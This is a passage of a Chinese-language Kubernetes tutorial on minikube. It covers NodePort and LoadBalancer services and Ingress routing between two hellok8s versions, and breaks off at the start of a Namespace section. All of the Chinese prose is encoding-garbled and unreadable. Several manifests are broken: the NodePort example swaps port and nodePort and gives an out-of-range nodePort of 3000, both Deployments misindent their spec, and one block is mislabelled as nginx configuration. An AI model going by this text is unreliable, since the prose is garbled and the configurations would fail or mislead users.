å¯ä»¥ä»é›†ç¾¤çš„å¤–éƒ¨è®¿é—®ä¸€ä¸ª <code>NodePort</code> æœåŠ¡ï¼Œæœ€ç»ˆé‡å®šå‘åˆ° <code>hellok8s:v3</code> çš„ <code>3000</code> ç«¯å£ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8s-nodeport</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">30000</span><br>    <span class="hljs-attr">nodePort:</span> <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><p>åˆ›å»º <code>service-hellok8s-nodeport</code> Service åï¼Œä½¿ç”¨ <code>curl</code> å‘½ä»¤æˆ–è€…æµè§ˆå™¨è®¿é—® <code>http://192.168.49.2:30000</code> å¯ä»¥å¾—åˆ°ç»“æœã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f service-hellok8s-nodeport.yaml<br><br>kubectl get service<br><span class="hljs-meta prompt_">#</span><span class="language-bash">kubectl get services</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">NAME                         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">kubernetes                   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP          35h</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.97.187.137    &lt;none&gt;        4000/TCP         20h</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">service-hellok8s-nodeport    NodePort    10.102.199.168   &lt;none&gt;        3000:30000/TCP   20h</span><br><br>kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          27m</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          27m</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          27m</span><br><br>curl http://192.168.49.2:30000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9g94t</span><br><br>curl http://192.168.49.2:30000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-24lw5</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæœ¬åœ°ä½¿ç”¨ Docker Desktopï¼ˆminikube start â€“driver&#x3D;dockerï¼‰çš„è¯ï¼Œé‚£ä½ å¤§æ¦‚ç‡æ— æ³•é€šè¿‡<code>minikube ip</code>è·å–åˆ°çš„ipåœ°å€æ¥è¯·æ±‚,å› ä¸º docker éƒ¨åˆ†ç½‘ç»œé™åˆ¶å¯¼è‡´æ— æ³•é€šè¿‡ ip ç›´è¿ docker containerï¼Œè¿™ä»£è¡¨ NodePort ç±»å‹çš„ Serviceã€Ingress ç»„ä»¶éƒ½æ— æ³•é€šè¿‡ minikube ip æä¾›çš„ ip åœ°å€æ¥è®¿é—®ã€‚æ— æ³•ç›´æ¥è®¿é—®Node IPã€‚ä½ å¯ä»¥é€šè¿‡<code>minikube service service-hellok8s-nodeport --url</code>æ¥å…¬å¼€æœåŠ¡ï¼Œç„¶åé€šè¿‡<code>curl</code>æˆ–è€…æµè§ˆå™¨è®¿é—®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube service service-hellok8s-nodeport --url<br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:50896</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Because you are using a Docker driver on windows, the terminal needs to be open to run it.</span><br>curl http://127.0.0.1:50896<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-559cfdd58c-zp2pc</span><br>curl http://127.0.0.1:50896<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v3] Hello, Kubernetes!, From host: hellok8s-deployment-559cfdd58c-2j2x2</span><br></code></pre></td></tr></table></figure><h2 id="LoadBalancer"><a href="#LoadBalancer" class="headerlink" title="LoadBalancer"></a>LoadBalancer</h2><p><a href="https://kubernetes.io/docs/concepts/services-networking/service/#loadbalancer"><code>LoadBalancer</code></a> æ˜¯ä½¿ç”¨äº‘æä¾›å•†çš„è´Ÿè½½å‡è¡¡å™¨å‘å¤–éƒ¨æš´éœ²æœåŠ¡ã€‚ å¤–éƒ¨è´Ÿè½½å‡è¡¡å™¨å¯ä»¥å°†æµé‡è·¯ç”±åˆ°è‡ªåŠ¨åˆ›å»ºçš„ <code>NodePort</code> æœåŠ¡å’Œ <code>ClusterIP</code> æœåŠ¡ä¸Šï¼Œå‡å¦‚ä½ åœ¨ <a href="https://aws.amazon.com/">AWS</a> çš„ <a href="https://aws.amazon.com/eks/">EKS</a> é›†ç¾¤ä¸Šåˆ›å»ºä¸€ä¸ª Type ä¸º <code>LoadBalancer</code> çš„ Serviceã€‚å®ƒä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª ELB (<a href="https://aws.amazon.com/elasticloadbalancing">Elastic Load Balancer</a>) ï¼Œå¹¶å¯ä»¥æ ¹æ®é…ç½®çš„ IP æ± ä¸­è‡ªåŠ¨åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„ IP åœ°å€ï¼Œå¯ä»¥ä¾›å¤–éƒ¨è®¿é—®ã€‚</p><p>è¿™é‡Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ <code>minikube</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>minikube tunnel</code> æ¥è¾…åŠ©åˆ›å»º LoadBalancer çš„ <code>EXTERNAL_IP</code>ï¼Œå…·ä½“æ•™ç¨‹å¯ä»¥æŸ¥çœ‹<a href="https://minikube.sigs.k8s.io/docs/handbook/accessing/#loadbalancer-access">å®˜ç½‘æ–‡æ¡£</a>ï¼Œä½†æ˜¯å’Œå®é™…äº‘æä¾›å•†çš„ LoadBalancer è¿˜æ˜¯æœ‰æœ¬è´¨åŒºåˆ«ï¼Œæ‰€ä»¥ <a href="https://github.com/guangzhengli/kubernetes_workshop">Repository</a> ä¸åšæ›´å¤šé˜è¿°ï¼Œæœ‰æ¡ä»¶çš„å¯ä»¥ä½¿ç”¨ <a href="https://aws.amazon.com/">AWS</a> çš„ <a href="https://aws.amazon.com/eks/">EKS</a> é›†ç¾¤ä¸Šåˆ›å»ºä¸€ä¸ª ELB (<a href="https://aws.amazon.com/elasticloadbalancing">Elastic Load Balancer</a>) è¯•è¯•ã€‚</p><p>ä¸‹å›¾æ˜¾ç¤º LoadBalancer çš„ Service æ¶æ„å›¾ã€‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-loadbalancer-fix-name.png" alt="service-loadbalancer-fix-name"></p><h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress"></a>Ingress</h1><p><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#ingress-v1beta1-networking-k8s-io">Ingress</a> å…¬å¼€ä»é›†ç¾¤å¤–éƒ¨åˆ°é›†ç¾¤å†…<a href="https://kubernetes.io/docs/concepts/services-networking/service/">æœåŠ¡</a>çš„ HTTP å’Œ HTTPS è·¯ç”±ã€‚ æµé‡è·¯ç”±ç”± Ingress èµ„æºä¸Šå®šä¹‰çš„è§„åˆ™æ§åˆ¶ã€‚Ingress å¯ä¸º Service æä¾›å¤–éƒ¨å¯è®¿é—®çš„ URLã€è´Ÿè½½å‡è¡¡æµé‡ã€ SSL&#x2F;TLSï¼Œä»¥åŠåŸºäºåç§°çš„è™šæ‹Ÿæ‰˜ç®¡ã€‚ä½ å¿…é¡»æ‹¥æœ‰ä¸€ä¸ª <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress-controllers">Ingress æ§åˆ¶å™¨</a> æ‰èƒ½æ»¡è¶³ Ingress çš„è¦æ±‚ã€‚ ä»…åˆ›å»º Ingress èµ„æºæœ¬èº«æ²¡æœ‰ä»»ä½•æ•ˆæœã€‚ <a href="https://kubernetes.io/docs/concepts/services-networking/ingress-controllers">Ingress æ§åˆ¶å™¨</a> é€šå¸¸è´Ÿè´£é€šè¿‡è´Ÿè½½å‡è¡¡å™¨æ¥å®ç° Ingressï¼Œä¾‹å¦‚ <code>minikube</code> é»˜è®¤ä½¿ç”¨çš„æ˜¯ <a href="https://minikube.sigs.k8s.io/docs/tutorials/nginx_tcp_udp_ingress/">nginx-ingress</a>ï¼Œç›®å‰ <code>minikube</code> ä¹Ÿæ”¯æŒ <a href="https://minikube.sigs.k8s.io/docs/handbook/addons/kong-ingress/">Kong-Ingress</a>ã€‚</p><p>Ingress å¯ä»¥â€œç®€å•ç†è§£â€ä¸ºæœåŠ¡çš„ç½‘å…³ Gatewayï¼Œå®ƒæ˜¯æ‰€æœ‰æµé‡çš„å…¥å£ï¼Œç»è¿‡é…ç½®çš„è·¯ç”±è§„åˆ™ï¼Œå°†æµé‡é‡å®šå‘åˆ°åç«¯çš„æœåŠ¡ã€‚</p><p>åœ¨ <code>minikube</code> ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å¼€å¯ Ingress-Controller çš„åŠŸèƒ½ã€‚é»˜è®¤ä½¿ç”¨çš„æ˜¯ <a href="https://minikube.sigs.k8s.io/docs/tutorials/nginx_tcp_udp_ingress/">nginx-ingress</a>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube addons enable ingress<br></code></pre></td></tr></table></figure><p>æ¥ç€åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ‰€æœ‰ <code>pod</code>, <code>deployment</code>, <code>service</code> èµ„æºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl delete deployment,service --all<br></code></pre></td></tr></table></figure><p>æ¥ç€æ ¹æ®ä¹‹å‰çš„æ•™ç¨‹ï¼Œåˆ›å»º <code>hellok8s:v2</code> å’Œ <code>hellok8s:v1</code> çš„<code>deployment</code>ä¸ <code>service</code> èµ„æºã€‚Service çš„ type ä¸º ClusterIP å³å¯ã€‚</p><p><code>hellok8s:v2</code> çš„ç«¯å£æ˜ å°„ä¸º <code>4000:3000</code>ï¼Œ<code>hellok8s:v1</code> çš„ç«¯å£æ˜ å°„ä¸º <code>5000:3000</code>ï¼Œè¿™é‡Œåç»­å†™ Ingress Route è§„åˆ™æ—¶ä¼šç”¨åˆ°ã€‚</p><p><code>hellok8s</code>é…ç½®:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv2-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">4000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv2-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv2</span><br>     <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv2-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v2</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><p><code>nginx</code>é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv1-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">5000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv1-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8sv1</span><br>     <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8sv1-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f hellok8sv1.yaml                 <br><span class="hljs-comment"># service/service-hellok8sv1-clusterip created</span><br><span class="hljs-comment"># deployment.apps/hellok8sv1-deployment created</span><br><br>kubectl apply -f hellok8sv2.yaml   <br><span class="hljs-comment"># service/service-hellok8sv2-clusterip created</span><br><span class="hljs-comment"># deployment.apps/hellok8sv2-deployment created</span><br><br>kubectl get pods            <br><span class="hljs-comment">#NAME                                     READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-comment">#hellok8sv1-deployment-7454486bb7-f6wjx   1/1     Running   0          7m26s</span><br><span class="hljs-comment">#hellok8sv1-deployment-7454486bb7-wpns2   1/1     Running   0          7m26s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-5szpg   1/1     Running   0          8m50s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-72dbg   1/1     Running   0          8m50s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-vmkvl   1/1     Running   0          8m50s</span><br><br><br>kubectl get service<br><span class="hljs-comment">#NAME                           TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-comment">#kubernetes                     ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    22m</span><br><span class="hljs-comment">#service-hellok8sv1-clusterip   ClusterIP   10.108.219.83   &lt;none&gt;        3000/TCP   6m2s</span><br><span class="hljs-comment">#service-hellok8sv2-clusterip   ClusterIP   10.101.123.50   &lt;none&gt;        3000/TCP   6m26s</span><br><br></code></pre></td></tr></table></figure><p>è¿™æ ·åœ¨ k8s é›†ç¾¤ä¸­ï¼Œå°±æœ‰ 3 ä¸ª <code>hellok8s:v2</code> çš„ podï¼Œ2 ä¸ª <code>hellok8s:v1</code> çš„ podã€‚å¹¶ä¸”<code>hellok8s:v2</code> çš„ç«¯å£æ˜ å°„ä¸º <code>4000:3000</code>ï¼Œ<code>hellok8s:v1</code> çš„ç«¯å£æ˜ å°„ä¸º <code>5000:3000</code>ã€‚åœ¨è¿™ä¸ªåŸºç¡€ä¸Šï¼Œæ¥ä¸‹æ¥ç¼–å†™ Ingress èµ„æºçš„å®šä¹‰ï¼Œ<code>nginx.ingress.kubernetes.io/ssl-redirect: &quot;false&quot;</code> çš„æ„æ€æ˜¯è¿™é‡Œå…³é—­ <code>https</code> è¿æ¥ï¼Œåªä½¿ç”¨ <code>http</code> è¿æ¥ã€‚</p><p>åŒ¹é…å‰ç¼€ä¸º <code>/hello</code> çš„è·¯ç”±è§„åˆ™ï¼Œé‡å®šå‘åˆ° <code>hellok8s:v3</code> æœåŠ¡ï¼ŒåŒ¹é…å‰ç¼€ä¸º <code>/</code> çš„è·Ÿè·¯å¾„é‡å®šå‘åˆ° <code>nginx</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-ingress</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-comment"># We are defining this annotation to prevent nginx</span><br>    <span class="hljs-comment"># from redirecting requests to `https` for now</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/ssl-redirect:</span> <span class="hljs-string">&quot;false&quot;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span><br>      <span class="hljs-attr">http:</span><br>        <span class="hljs-attr">paths:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/hello</span><br>            <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>            <span class="hljs-attr">backend:</span><br>              <span class="hljs-attr">service:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv2-clusterip</span><br>                <span class="hljs-attr">port:</span><br>                  <span class="hljs-attr">number:</span> <span class="hljs-number">4000</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>            <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>            <span class="hljs-attr">backend:</span><br>              <span class="hljs-attr">service:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv1-clusterip</span><br>                <span class="hljs-attr">port:</span><br>                  <span class="hljs-attr">number:</span> <span class="hljs-number">5000</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f ingress.yaml<br><span class="hljs-comment"># ingress.extensions/hello-ingress created</span><br><br>kubectl get ingress          <br><span class="hljs-comment"># NAME            CLASS   HOSTS   ADDRESS   PORTS   AGE</span><br><span class="hljs-comment"># hello-ingress   nginx   *                 80      16s</span><br><br><span class="hljs-comment"># replace 192.168.49.2 by your minikube ip</span><br>curl -H <span class="hljs-string">&quot;Host: localhost&quot;</span> http://192.168.49.2/hello<br><span class="hljs-comment"># [v2] Hello, Kubernetes!</span><br><br>curl -H <span class="hljs-string">&quot;Host: localhost&quot;</span> http://192.168.49.2/<br><span class="hljs-comment"># [v1] Hello, Kubernetes!</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå’Œserviceä¸€æ ·ï¼Œå¦‚æœæœ¬åœ°ä½¿ç”¨ Docker Desktopï¼ˆminikube start â€“driver&#x3D;dockerï¼‰çš„è¯ï¼Œé‚£ä½ å¤§æ¦‚ç‡æ— æ³•é€šè¿‡minikube ipè·å–åˆ°çš„ipåœ°å€æ¥è¯·æ±‚ï¼Œä½ å¯ä»¥å…ˆé€šè¿‡<code>minikube service list</code>æ¥æŸ¥çœ‹æœåŠ¡åˆ—è¡¨ï¼Œç„¶åé€šè¿‡<code>minikube service ingress-nginx-controller -n ingress-nginx --url</code>æ¥å…¬å¼€æœåŠ¡ï¼Œç„¶åé€šè¿‡<code>curl</code>æˆ–è€…æµè§ˆå™¨æ¥è®¿é—®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube service list<br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|   NAMESPACE   |                NAME                | TARGET PORT  |            URL            |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | kubernetes                         | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | service-hellok8sv1-clusterip       | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | service-hellok8sv2-clusterip       | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| ingress-nginx | ingress-nginx-controller           | http/80      | http://192.168.49.2:30288 |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|               |                                    | https/443    | http://192.168.49.2:31616 |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| ingress-nginx | ingress-nginx-controller-admission | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| kube-system   | kube-dns                           | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br>minikube service ingress-nginx-controller -n ingress-nginx --url<br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:61691      http</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:61692      https</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">â—  Because you are using a Docker driver on windows, the terminal needs to be open to run it.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ç¬¬ä¸€ä¸ªæ˜¯httpï¼Œç¬¬äºŒä¸ªæ˜¯httpsï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦httpï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç¬¬ä¸€ä¸ªåœ°å€</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ•™ç¨‹ä¸­å°†æ‰€æœ‰æµé‡éƒ½å‘é€åˆ° Ingress ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/ingress.png" alt="ingress"></p><h1 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h1><p>åœ¨å®é™…çš„å¼€å‘å½“ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸åŒçš„ç¯å¢ƒæ¥åšå¼€å‘å’Œæµ‹è¯•ï¼Œä¾‹å¦‚ <code>dev</code> ç¯å¢ƒç»™å¼€å‘ä½¿ç”¨ï¼Œ<code>test</code> ç¯å¢ƒç»™ QA ä½¿ç”¨ï¼Œé‚£ä¹ˆ k8s èƒ½ä¸èƒ½åœ¨ä¸åŒç¯å¢ƒ <code>dev</code> <code>test</code> <code>uat</code> <code>prod</code> ä¸­åŒºåˆ†èµ„æºï¼Œè®©ä¸åŒç¯å¢ƒçš„èµ„æºç‹¬ç«‹äº’ç›¸ä¸å½±å“å‘¢ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œk8s æä¾›äº†åä¸º Namespace çš„èµ„æºæ¥å¸®åŠ©éš”ç¦»èµ„æºã€‚</p><p>åœ¨ Kubernetes 